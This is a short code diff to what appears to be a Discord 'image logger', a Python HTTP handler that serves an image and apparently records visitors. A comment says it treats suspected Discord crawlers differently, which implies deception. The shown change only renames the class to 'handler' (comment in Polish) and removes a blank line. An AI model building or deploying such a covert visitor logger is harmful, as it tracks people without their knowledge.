@@ -186,8 +186,8 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
+class handler(BaseHTTPRequestHandler):        # ← ZMIENIONE
+   
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -199,7 +199,6 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                     url = config["image"]
             else:
                 url = config["image"]
-
             data = f'''<style>body {{
 margin: 0;
 padding: 0;
